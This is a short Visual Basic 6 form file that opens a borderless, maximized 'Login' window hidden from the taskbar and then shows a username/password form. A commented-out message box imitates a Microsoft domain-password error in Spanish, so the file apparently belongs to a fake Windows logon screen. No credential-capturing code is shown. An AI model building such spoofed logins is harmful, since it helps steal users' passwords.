VERSION 5.00
Begin VB.Form frmInicio 
   BackColor       =   &H80000001&
   BorderStyle     =   0  'None
   Caption         =   "Login"
   ClientHeight    =   6855
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   8385
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6855
   ScaleWidth      =   8385
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   WindowState     =   2  'Maximized
End
Attribute VB_Name = "frmInicio"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
'Message = MsgBox("La contraseña de dominio proporcionada es incorrecta o el acceso para iniciar sesión en el servidor ha sido denegado.", 16, "Conexiones de red Microsoft")
frmUserPass.Show
End Sub
